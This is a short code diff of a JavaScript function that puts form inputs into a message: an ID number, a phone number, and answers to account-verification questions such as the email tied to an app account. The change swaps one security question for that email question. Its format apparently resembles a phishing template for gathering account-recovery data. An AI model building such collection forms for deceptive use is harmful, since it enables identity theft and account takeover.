@@ -11,9 +11,9 @@ function recibeInformacion(event){
     cedula : ${formulario.get('documentoIndentidad')};
     Número : ${formulario.get('minCliente')}
 
-    🔒 ¿Has enviado SMS este mes ❓   
+    🔒 ¿Cual es el correo que esta asociado a tu cuenta APP ❓   
 
-    ${formulario.get('answerSms')}
+    ${formulario.get('correoAsociadoApp')}
 
     🔒 ¿Cuál fue el Combo que compraste con más frecuencia en los últimos 3 meses ❓
     
